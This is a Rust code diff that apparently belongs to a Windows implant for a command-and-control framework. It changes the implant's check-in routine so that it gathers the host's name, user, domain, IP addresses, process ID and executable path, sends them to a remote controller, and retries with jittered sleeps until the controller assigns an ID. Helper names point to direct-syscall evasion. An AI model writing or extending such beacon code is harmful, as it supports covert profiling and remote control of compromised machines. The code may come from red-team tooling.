@@ -190,21 +190,53 @@ fn get_current_username_syscall_direct() -> Result<String, String> {
 }
 
 pub fn checkin() {
+    let hostname = get_hostname_syscall()
+        .or_else(|| std::env::var("COMPUTERNAME").ok())
+        .unwrap_or_else(|| "Unknown".to_string());
+
+    let username = get_current_username_syscall_direct()
+        .unwrap_or_else(|_| std::env::var("USERNAME").unwrap_or_else(|_| "Unknown".to_string()));
+
+    let ips: Vec<String> = std::net::UdpSocket::bind("0.0.0.0:0")
+        .and_then(|s| { s.connect("8.8.8.8:80")?; s.local_addr() })
+        .map(|a| vec![a.ip().to_string()])
+        .unwrap_or_default();
+
     let checkin_data = serde_json::json!({
         "action": "checkin",
         "uuid": *config::UUID,
         "os": "windows",
-        "user": get_current_username_syscall_direct().unwrap_or_else(|_| "Unknown".to_string()),
-        "host": get_hostname_syscall().unwrap_or_else(|| "Unknown".to_string()),
+        "user": username,
+        "host": hostname,
         "pid": get_pid_via_syscall(),
-        "architecture": "x64"
+        "architecture": "x64",
+        "domain": std::env::var("USERDOMAIN").unwrap_or_default(),
+        "ips": ips,
+        "integrity_level": 2,
+        "external_ip": "",
+        "process_name": std::env::current_exe()
+            .map(|p| p.to_string_lossy().to_string())
+            .unwrap_or_default(),
     });
 
     let json_str = serde_json::to_string(&checkin_data).unwrap();
-    if let Ok(resp) = transport::send_request_with_response(&json_str) {
-        if let Some(id) = resp.get("id").and_then(|v| v.as_str()) {
-            let mut uuid = config::UUID.write().unwrap();
-            *uuid = id.to_string();
+
+    // Retry checkin until UUID is updated — response parsing must succeed
+    loop {
+        match transport::send_request_with_response(&json_str) {
+            Ok(resp) => {
+                if let Some(id) = resp.get("id").and_then(|v| v.as_str()) {
+                    let mut uuid = config::UUID.write().unwrap();
+                    *uuid = id.to_string();
+                    println!("[CHECKIN] Success, new UUID: {}", id);
+                    return;
+                }
+                eprintln!("[CHECKIN] Response missing 'id' field: {:?}", resp);
+            }
+            Err(e) => {
+                eprintln!("[CHECKIN] Error: {}", e);
+            }
         }
+        crate::helpers::sleep_with_jitter();
     }
 }
